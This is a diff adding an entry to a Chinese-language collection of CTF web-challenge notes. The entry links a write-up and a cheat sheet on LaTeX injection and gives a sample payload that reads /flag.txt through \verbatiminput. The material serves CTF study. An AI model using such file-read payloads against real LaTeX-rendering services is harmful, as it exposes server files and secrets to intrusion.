@@ -2676,3 +2676,14 @@ SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。
         ```
 271. [Warmuprofile](https://blog.arkark.dev/2023/07/17/zer0pts-ctf/)
 - 处理多线程很麻烦，如果只是一些简单的操作(shell用命令直接实现的)，直接用python的`subprocess.run`就好了
+272. [latek](https://github.com/D13David/ctf-writeups/tree/main/amateursctf23/web/latek)
+- [Latex injection](https://salmonsec.com/cheatsheets/exploitation/latex_injection)
+    - 其它payload
+        ```latex
+        \documentclass{article}
+        \usepackage{verbatim}
+        \begin{document}
+        Hello, world!!!
+        \verbatiminput{/flag.txt}
+        \end{document}
+        ```
